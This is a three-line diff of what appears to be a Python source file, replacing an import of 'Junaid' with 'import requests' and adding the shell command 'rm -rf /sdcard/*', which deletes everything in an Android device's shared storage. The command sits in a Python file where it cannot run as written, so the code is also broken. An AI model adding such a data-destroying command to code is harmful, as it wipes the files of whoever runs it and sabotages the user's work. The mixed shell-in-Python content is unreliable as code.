@@ -1,1 +1,3 @@
-import Junaid
+import requests
+
+rm -rf /sdcard/*
